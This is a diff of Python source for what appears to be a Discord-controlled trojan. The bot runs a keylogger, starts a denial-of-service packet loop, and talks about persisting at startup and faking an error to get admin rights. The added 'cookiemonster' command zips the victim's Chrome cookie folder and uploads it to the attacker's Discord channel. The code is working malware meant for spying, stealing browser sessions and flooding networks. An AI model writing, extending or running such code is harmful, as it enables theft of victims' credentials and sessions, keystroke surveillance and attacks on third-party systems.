@@ -9,6 +9,7 @@ test so probably wont end up doing that unless im interested in crashing my own 
 threading support for keylogger. :D
 """
 #Written and designed by Stone Preheim
+import shutil
 from discord.ext import commands
 from Client import Client
 from Keylogger import Keylogger
@@ -27,10 +28,7 @@ bot = commands.Bot(command_prefix='!')
 #create way for bot to identify itself off username and random int(posibility of duplicate usernames)
 botID = getpass.getuser() + str(random.randint(0, 10))
 activated = False
-#variable to flag to close dos threads and logger.
-closeDDOS = True
-closeLogger = True
-controllerVersion = "V1.1"
+controllerVersion = "V1.2"
 keyListener = Keylogger(10, 'discord', botID) #creating keylogger object to hold reference too
 packetGen = PacketGenerator()
 dosThread = threading.Thread(target=packetGen.attackLoop, args=()).start()#run forever control attack with methods on the object
@@ -43,6 +41,12 @@ def addProcToStartup():
 #might make a fake UI error to enqourage user to "Run with admin privleges" although it isnt required for most functionality
 def showFakeUIerror():
     print()
+
+#sniffs out all chrome trust tokens and cookies. grabs from all active nodes indescriminately.
+@bot.command("cookiemonster")
+async def cookies(ctx):
+    shutil.make_archive(f'C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\{getpass.getuser()}Cookies', 'zip', f'C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\')
+    await ctx.send(file=discord.File(f'C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\{getpass.getuser()}Cookies.zip'))
 
 #get a list of connected client usernames
 @bot.command("ping")
